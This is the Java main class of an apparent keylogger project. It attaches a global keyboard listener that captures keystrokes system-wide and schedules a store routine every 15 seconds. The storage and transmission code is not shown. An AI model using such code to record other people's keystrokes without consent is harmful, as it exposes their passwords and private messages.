package com.keytracker;


import com.keytracker.threads.ScheduleRunner;
import de.ksquared.system.keyboard.GlobalKeyListener;
import de.ksquared.system.keyboard.KeyListener;

import java.util.concurrent.TimeUnit;

public class KeyboardLoggerApp {
    public static void main(String[] args) {
        KeyTrackerService keyTrackerService = new KeyTrackerService(args);
        KeyListener keyListener = keyTrackerService.getKeyListener();
        StoreMechanism storeMechanism = keyTrackerService.getStoreMechanism();

        new GlobalKeyListener().addKeyListener(keyListener);

        new ScheduleRunner(storeMechanism).scheduleAll(15, 15, TimeUnit.SECONDS);
    }
}